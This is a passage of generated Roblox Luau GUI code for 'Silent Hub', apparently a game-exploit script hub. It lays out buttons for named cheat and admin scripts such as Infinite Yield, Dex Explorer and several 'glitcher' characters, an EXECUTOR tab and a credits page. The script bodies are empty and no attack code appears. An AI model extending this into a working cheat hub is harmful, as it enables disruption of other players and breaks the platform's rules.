G2L["ef"]["Thickness"] = 1.8;
G2L["ef"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.John Doe
G2L["f0"] = Instance.new("TextButton", G2L["d9"]);
G2L["f0"]["TextWrapped"] = true;
G2L["f0"]["BorderSizePixel"] = 0;
G2L["f0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f0"]["TextSize"] = 12;
G2L["f0"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["f0"]["RichText"] = true;
G2L["f0"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f0"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["f0"]["Name"] = [[John Doe]];
G2L["f0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f0"]["Text"] = [[John Doe (R6)]];
G2L["f0"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.John Doe.LocalScript
G2L["f1"] = Instance.new("LocalScript", G2L["f0"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.John Doe.UIStroke
G2L["f2"] = Instance.new("UIStroke", G2L["f0"]);
G2L["f2"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["f2"]["Thickness"] = 1.8;
G2L["f2"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Infinite Yield
G2L["f3"] = Instance.new("TextButton", G2L["d9"]);
G2L["f3"]["TextWrapped"] = true;
G2L["f3"]["BorderSizePixel"] = 0;
G2L["f3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f3"]["TextSize"] = 12;
G2L["f3"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["f3"]["RichText"] = true;
G2L["f3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f3"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["f3"]["Name"] = [[Infinite Yield]];
G2L["f3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f3"]["Text"] = [[Infinite Yield]];
G2L["f3"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Infinite Yield.LocalScript
G2L["f4"] = Instance.new("LocalScript", G2L["f3"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Infinite Yield.UIStroke
G2L["f5"] = Instance.new("UIStroke", G2L["f3"]);
G2L["f5"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["f5"]["Thickness"] = 1.8;
G2L["f5"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Star Glitcher
G2L["f6"] = Instance.new("TextButton", G2L["d9"]);
G2L["f6"]["TextWrapped"] = true;
G2L["f6"]["BorderSizePixel"] = 0;
G2L["f6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f6"]["TextSize"] = 12;
G2L["f6"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["f6"]["RichText"] = true;
G2L["f6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f6"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["f6"]["Name"] = [[Star Glitcher]];
G2L["f6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f6"]["Text"] = [[Star Glitcher (R6)]];
G2L["f6"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Star Glitcher.LocalScript
G2L["f7"] = Instance.new("LocalScript", G2L["f6"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Star Glitcher.UIStroke
G2L["f8"] = Instance.new("UIStroke", G2L["f6"]);
G2L["f8"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["f8"]["Thickness"] = 1.8;
G2L["f8"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Deyonance Glitcher
G2L["f9"] = Instance.new("TextButton", G2L["d9"]);
G2L["f9"]["TextWrapped"] = true;
G2L["f9"]["BorderSizePixel"] = 0;
G2L["f9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f9"]["TextSize"] = 12;
G2L["f9"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["f9"]["RichText"] = true;
G2L["f9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f9"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["f9"]["Name"] = [[Deyonance Glitcher]];
G2L["f9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f9"]["Text"] = [[Deyonance Glitcher (R6)]];
G2L["f9"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Deyonance Glitcher.LocalScript
G2L["fa"] = Instance.new("LocalScript", G2L["f9"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Deyonance Glitcher.UIStroke
G2L["fb"] = Instance.new("UIStroke", G2L["f9"]);
G2L["fb"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["fb"]["Thickness"] = 1.8;
G2L["fb"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Cisynia Glitcher
G2L["fc"] = Instance.new("TextButton", G2L["d9"]);
G2L["fc"]["TextWrapped"] = true;
G2L["fc"]["BorderSizePixel"] = 0;
G2L["fc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["fc"]["TextSize"] = 12;
G2L["fc"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["fc"]["RichText"] = true;
G2L["fc"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["fc"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["fc"]["Name"] = [[Cisynia Glitcher]];
G2L["fc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["fc"]["Text"] = [[Cisynia Glitcher (R6)]];
G2L["fc"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Cisynia Glitcher.LocalScript
G2L["fd"] = Instance.new("LocalScript", G2L["fc"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Cisynia Glitcher.UIStroke
G2L["fe"] = Instance.new("UIStroke", G2L["fc"]);
G2L["fe"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["fe"]["Thickness"] = 1.8;
G2L["fe"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Neptunian Sword
G2L["ff"] = Instance.new("TextButton", G2L["d9"]);
G2L["ff"]["TextWrapped"] = true;
G2L["ff"]["BorderSizePixel"] = 0;
G2L["ff"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ff"]["TextSize"] = 12;
G2L["ff"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["ff"]["RichText"] = true;
G2L["ff"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ff"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["ff"]["Name"] = [[Neptunian Sword]];
G2L["ff"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ff"]["Text"] = [[Neptunian Sword (R6)]];
G2L["ff"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Neptunian Sword.LocalScript
G2L["100"] = Instance.new("LocalScript", G2L["ff"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Neptunian Sword.UIStroke
G2L["101"] = Instance.new("UIStroke", G2L["ff"]);
G2L["101"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["101"]["Thickness"] = 1.8;
G2L["101"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Rainbow Stand
G2L["102"] = Instance.new("TextButton", G2L["d9"]);
G2L["102"]["TextWrapped"] = true;
G2L["102"]["BorderSizePixel"] = 0;
G2L["102"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["102"]["TextSize"] = 12;
G2L["102"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["102"]["RichText"] = true;
G2L["102"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["102"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["102"]["Name"] = [[Rainbow Stand]];
G2L["102"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["102"]["Text"] = [[Rainbow Stand (R6)]];
G2L["102"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Rainbow Stand.LocalScript
G2L["103"] = Instance.new("LocalScript", G2L["102"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Rainbow Stand.UIStroke
G2L["104"] = Instance.new("UIStroke", G2L["102"]);
G2L["104"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["104"]["Thickness"] = 1.8;
G2L["104"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Mr. Bean Admin
G2L["105"] = Instance.new("TextButton", G2L["d9"]);
G2L["105"]["TextWrapped"] = true;
G2L["105"]["BorderSizePixel"] = 0;
G2L["105"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["105"]["TextSize"] = 12;
G2L["105"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["105"]["RichText"] = true;
G2L["105"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["105"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["105"]["Name"] = [[Mr. Bean Admin]];
G2L["105"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["105"]["Text"] = [[Mr. Bean Admin]];
G2L["105"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Mr. Bean Admin.LocalScript
G2L["106"] = Instance.new("LocalScript", G2L["105"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Mr. Bean Admin.UIStroke
G2L["107"] = Instance.new("UIStroke", G2L["105"]);
G2L["107"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["107"]["Thickness"] = 1.8;
G2L["107"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Last Star
G2L["108"] = Instance.new("TextButton", G2L["d9"]);
G2L["108"]["TextWrapped"] = true;
G2L["108"]["BorderSizePixel"] = 0;
G2L["108"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["108"]["TextSize"] = 12;
G2L["108"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["108"]["RichText"] = true;
G2L["108"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["108"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["108"]["Name"] = [[Last Star]];
G2L["108"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["108"]["Text"] = [[Last Star (R6)]];
G2L["108"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Last Star.LocalScript
G2L["109"] = Instance.new("LocalScript", G2L["108"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Last Star.UIStroke
G2L["10a"] = Instance.new("UIStroke", G2L["108"]);
G2L["10a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["10a"]["Thickness"] = 1.8;
G2L["10a"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Calamity
G2L["10b"] = Instance.new("TextButton", G2L["d9"]);
G2L["10b"]["TextWrapped"] = true;
G2L["10b"]["BorderSizePixel"] = 0;
G2L["10b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10b"]["TextSize"] = 12;
G2L["10b"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["10b"]["RichText"] = true;
G2L["10b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10b"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["10b"]["Name"] = [[Calamity]];
G2L["10b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10b"]["Text"] = [[Calamity (R6)]];
G2L["10b"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Calamity.LocalScript
G2L["10c"] = Instance.new("LocalScript", G2L["10b"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Calamity.UIStroke
G2L["10d"] = Instance.new("UIStroke", G2L["10b"]);
G2L["10d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["10d"]["Thickness"] = 1.8;
G2L["10d"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Killbot
G2L["10e"] = Instance.new("TextButton", G2L["d9"]);
G2L["10e"]["TextWrapped"] = true;
G2L["10e"]["BorderSizePixel"] = 0;
G2L["10e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10e"]["TextSize"] = 12;
G2L["10e"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["10e"]["RichText"] = true;
G2L["10e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10e"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["10e"]["Name"] = [[Killbot]];
G2L["10e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10e"]["Text"] = [[Killbot (R6)]];
G2L["10e"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Killbot.LocalScript
G2L["10f"] = Instance.new("LocalScript", G2L["10e"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Killbot.UIStroke
G2L["110"] = Instance.new("UIStroke", G2L["10e"]);
G2L["110"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["110"]["Thickness"] = 1.8;
G2L["110"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Sledge Hammer
G2L["111"] = Instance.new("TextButton", G2L["d9"]);
G2L["111"]["TextWrapped"] = true;
G2L["111"]["BorderSizePixel"] = 0;
G2L["111"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["111"]["TextSize"] = 12;
G2L["111"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["111"]["RichText"] = true;
G2L["111"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["111"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["111"]["Name"] = [[Sledge Hammer]];
G2L["111"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["111"]["Text"] = [[Sledge Hammer (R6)]];
G2L["111"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Sledge Hammer.LocalScript
G2L["112"] = Instance.new("LocalScript", G2L["111"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Sledge Hammer.UIStroke
G2L["113"] = Instance.new("UIStroke", G2L["111"]);
G2L["113"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["113"]["Thickness"] = 1.8;
G2L["113"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Secret Service Panel
G2L["114"] = Instance.new("TextButton", G2L["d9"]);
G2L["114"]["TextWrapped"] = true;
G2L["114"]["BorderSizePixel"] = 0;
G2L["114"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["114"]["TextSize"] = 12;
G2L["114"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["114"]["RichText"] = true;
G2L["114"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["114"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["114"]["Name"] = [[Secret Service Panel]];
G2L["114"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["114"]["Text"] = [[Secret Service Panel]];
G2L["114"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Secret Service Panel.LocalScript
G2L["115"] = Instance.new("LocalScript", G2L["114"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Secret Service Panel.UIStroke
G2L["116"] = Instance.new("UIStroke", G2L["114"]);
G2L["116"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["116"]["Thickness"] = 1.8;
G2L["116"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Dex Explorer
G2L["117"] = Instance.new("TextButton", G2L["d9"]);
G2L["117"]["TextWrapped"] = true;
G2L["117"]["BorderSizePixel"] = 0;
G2L["117"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["117"]["TextSize"] = 12;
G2L["117"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["117"]["RichText"] = true;
G2L["117"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["117"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["117"]["Name"] = [[Dex Explorer]];
G2L["117"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["117"]["Text"] = [[Dex Explorer]];
G2L["117"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Dex Explorer.LocalScript
G2L["118"] = Instance.new("LocalScript", G2L["117"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Dex Explorer.UIStroke
G2L["119"] = Instance.new("UIStroke", G2L["117"]);
G2L["119"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["119"]["Thickness"] = 1.8;
G2L["119"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Hacker X
G2L["11a"] = Instance.new("TextButton", G2L["d9"]);
G2L["11a"]["TextWrapped"] = true;
G2L["11a"]["BorderSizePixel"] = 0;
G2L["11a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11a"]["TextSize"] = 12;
G2L["11a"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["11a"]["RichText"] = true;
G2L["11a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11a"]["Size"] = UDim2.new(0, 457, 0, 22);
G2L["11a"]["Name"] = [[Hacker X]];
G2L["11a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11a"]["Text"] = [[Hacker X (R6)]];
G2L["11a"]["Position"] = UDim2.new(0.43487, 0, 0.40833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Hacker X.LocalScript
G2L["11b"] = Instance.new("LocalScript", G2L["11a"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Hacker X.UIStroke
G2L["11c"] = Instance.new("UIStroke", G2L["11a"]);
G2L["11c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["11c"]["Thickness"] = 1.8;
G2L["11c"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Credits
G2L["11d"] = Instance.new("Frame", G2L["6"]);
G2L["11d"]["Visible"] = false;
G2L["11d"]["BorderSizePixel"] = 0;
G2L["11d"]["BackgroundColor3"] = Color3.fromRGB(66, 66, 66);
G2L["11d"]["Size"] = UDim2.new(0, 500, 0, 223);
G2L["11d"]["Position"] = UDim2.new(0, 0, 0, 0);
G2L["11d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11d"]["Name"] = [[Credits]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Credits.Message
G2L["11e"] = Instance.new("TextLabel", G2L["11d"]);
G2L["11e"]["TextWrapped"] = true;
G2L["11e"]["BorderSizePixel"] = 0;
G2L["11e"]["TextSize"] = 20;
G2L["11e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11e"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["11e"]["BackgroundTransparency"] = 1;
G2L["11e"]["RichText"] = true;
G2L["11e"]["Size"] = UDim2.new(0, 500, 0, 188);
G2L["11e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11e"]["Text"] = [[<font weight="heavy" size="25">Silent Hub is fully coded by @hyperionhax, script credits go to their creators.</font><br/><font size="20">Have any suggestions?</font><br/><font size="20">Join the Discord by clicking on the link below!</font>]];
G2L["11e"]["Name"] = [[Message]];
G2L["11e"]["Position"] = UDim2.new(0, 0, 0.15695, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Credits.Message.UIStroke
G2L["11f"] = Instance.new("UIStroke", G2L["11e"]);
G2L["11f"]["Color"] = Color3.fromRGB(50, 50, 50);


-- StarterGui.Silent Hub.Main.MainContainer.Tabs
G2L["120"] = Instance.new("Frame", G2L["5"]);
G2L["120"]["BorderSizePixel"] = 0;
G2L["120"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["120"]["Size"] = UDim2.new(0, 500, 0, 35);
G2L["120"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["120"]["Name"] = [[Tabs]];
G2L["120"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Silent Hub.Main.MainContainer.Tabs.UIListLayout
G2L["121"] = Instance.new("UIListLayout", G2L["120"]);
G2L["121"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["121"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["121"]["Padding"] = UDim.new(0.03, 0);
G2L["121"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["121"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["121"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Server
G2L["122"] = Instance.new("TextButton", G2L["120"]);
G2L["122"]["TextWrapped"] = true;
G2L["122"]["BorderSizePixel"] = 0;
G2L["122"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["122"]["TextSize"] = 11;
G2L["122"]["BackgroundColor3"] = Color3.fromRGB(223, 223, 223);
G2L["122"]["RichText"] = true;
G2L["122"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["122"]["Size"] = UDim2.new(0, 68, 0, 22);
G2L["122"]["Name"] = [[Server]];
G2L["122"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["122"]["Text"] = [[SERVER]];
G2L["122"]["Position"] = UDim2.new(-0.085, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Server.LocalScript
G2L["123"] = Instance.new("LocalScript", G2L["122"]);



-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Server.UIStroke
G2L["124"] = Instance.new("UIStroke", G2L["122"]);
G2L["124"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["124"]["Thickness"] = 1.8;
G2L["124"]["Color"] = Color3.fromRGB(116, 116, 116);


-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Executor
G2L["125"] = Instance.new("TextButton", G2L["120"]);
G2L["125"]["TextWrapped"] = true;
G2L["125"]["BorderSizePixel"] = 0;
G2L["125"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["125"]["TextSize"] = 11;
G2L["125"]["BackgroundColor3"] = Color3.fromRGB(223, 223, 223);
G2L["125"]["RichText"] = true;
G2L["125"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["125"]["Size"] = UDim2.new(0, 68, 0, 22);
G2L["125"]["Name"] = [[Executor]];
G2L["125"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["125"]["Text"] = [[EXECUTOR]];
G2L["125"]["Position"] = UDim2.new(0.07705, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Executor.LocalScript
G2L["126"] = Instance.new("LocalScript", G2L["125"]);



-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Executor.UIStroke
G2L["127"] = Instance.new("UIStroke", G2L["125"]);
G2L["127"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["127"]["Thickness"] = 1.8;
G2L["127"]["Color"] = Color3.fromRGB(116, 116, 116);


-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Scripts
G2L["128"] = Instance.new("TextButton", G2L["120"]);
G2L["128"]["TextWrapped"] = true;
G2L["128"]["BorderSizePixel"] = 0;
G2L["128"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["128"]["TextSize"] = 11;
G2L["128"]["BackgroundColor3"] = Color3.fromRGB(223, 223, 223);
G2L["128"]["RichText"] = true;
G2L["128"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["128"]["Size"] = UDim2.new(0, 68, 0, 22);
G2L["128"]["Name"] = [[Scripts]];
G2L["128"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["128"]["Text"] = [[SCRIPTS]];
G2L["128"]["Position"] = UDim2.new(0.2391, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Scripts.LocalScript
G2L["129"] = Instance.new("LocalScript", G2L["128"]);



-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Scripts.UIStroke
G2L["12a"] = Instance.new("UIStroke", G2L["128"]);
G2L["12a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["12a"]["Thickness"] = 1.8;
G2L["12a"]["Color"] = Color3.fromRGB(116, 116, 116);


-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Players
G2L["12b"] = Instance.new("TextButton", G2L["120"]);
G2L["12b"]["TextWrapped"] = true;
G2L["12b"]["BorderSizePixel"] = 0;
G2L["12b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12b"]["TextSize"] = 11;
G2L["12b"]["BackgroundColor3"] = Color3.fromRGB(223, 223, 223);
G2L["12b"]["RichText"] = true;
G2L["12b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12b"]["Size"] = UDim2.new(0, 68, 0, 22);
G2L["12b"]["Name"] = [[Players]];
G2L["12b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12b"]["Text"] = [[PLAYERS]];
G2L["12b"]["Position"] = UDim2.new(0.40115, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Players.LocalScript
